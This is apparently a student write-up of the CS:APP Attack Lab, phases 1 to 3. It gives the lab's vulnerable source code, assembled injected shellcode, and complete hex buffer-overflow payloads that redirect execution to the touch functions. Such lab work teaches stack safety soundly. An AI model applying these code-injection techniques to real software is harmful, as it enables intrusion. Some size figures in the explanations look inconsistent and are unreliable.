# Attack Lab

> This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.

Before starting the lab, read [Writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf) & CSAPP 3.10.3, 3.10.4 carefully.

## Code Injection Attack

### Phase 1

> Same as textbook.

```c
// when s increase, %rsp address decrease
char *Gets(char *s) {
    int c;
    char *dest = s;
    while ((c = getchar()) != '\n' && c != EOF) {
        *dest++ = c;
    }
    if (c == EOF && dest == s)
        // No characters read
        return NULL;
    *dest++ = '\0'; // termination string
    return s;
}

unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}

// getbuf is called by test
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}

// our target
void touch1() {
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

What we need to do is to inject a return the address of `touch1()` to `getbuf()`.

In our case, gcc allocated `0x24` bytes for `getbuf()` - 40 bytes.
That is: if input is less than 23 bytes (stack saved 16 bytes, '\0' 1 byte), it will work well.
But if input is more than 23 bytes, it will cause buffer overflow.

We need to inject a return address to `getbuf()` via buffer overflow.
The address is `0x00000000004017c0`.

So, the answer is:

```bash
# we donot care about the low 40 bytes
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
c0 17 40 00 00 00 00 00 # little endian
```

### Phase 2

```c
void touch2(unsigned val) { // passed in %rdi
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

What we need to do is to inject code segment that store *cookie* to `%rdi`, and then call `touch2()`.
The only way to inject our code is to add our code segment to the string, make the string run as code.

The return address as above, should be our code segment's address.

```x86_64
0:	68 ec 17 40 00       	push   $0x4017ec
5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
c:	c3                   	ret
```

After `getbuf()` pushing stack, the `%rsp` is `0x5561dc78`. The first address of our code segment is
`0x5561dc78`, too.

So, the answer is:

```bash
68 ec 17 40 00 48 c7 c7 # code segment address, the dump code already little endian
fa 97 b9 59 c3 00 00 00
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
78 dc 61 55 00 00 00 00 # the address of our code segment
```

### Phase 3

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) { // passed in %rdi
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

We need to store an array to somewhere, very similar to phase 2.
In order to prevent the string stored in the stack from being destroyed,
we need to store it safely. Obviously we need to store it in the stack/heap.

The `ret` will pop the return address, so after jumping to `touch3()`,
the `%rsp` is controlled by `touch3()` & its callees.

We need to store it into [temporary] saved stack. According to CSAPP 3.10.3,
the saved location is less than `getbuf()`'s stack representing by address value.

```bash
# ASCII version of cookie
35 39 62 39 39 37 66 61
```

```x86_64
0: 68 fa 18 40 00       	push   $0x4018fa
5: 48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi # the string address, stored in stack bottom of getbuf()
c: c3                   	ret
```

So, the answer is:

```bash
68 fa 18 40 00 48 c7 c7 # 0x5561dc78=0x5561dca0-0x28 (getbuf() allocate memory)
a8 dc 61 55 c3 00 00 00
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
78 dc 61 55 00 00 00 00 # the address of our code segment; 0x5561dca0
35 39 62 39 39 37 66 61 # ASCII version of cookie; 0x5561dca0~0x5561dca8
# string is an array of char, head is '5'/'\35', tail is '\61'; first address is 0x5561dca0
```

> If we want to read the above hex from big to small(stack increase), we need to read from bottom to top, from left to right.
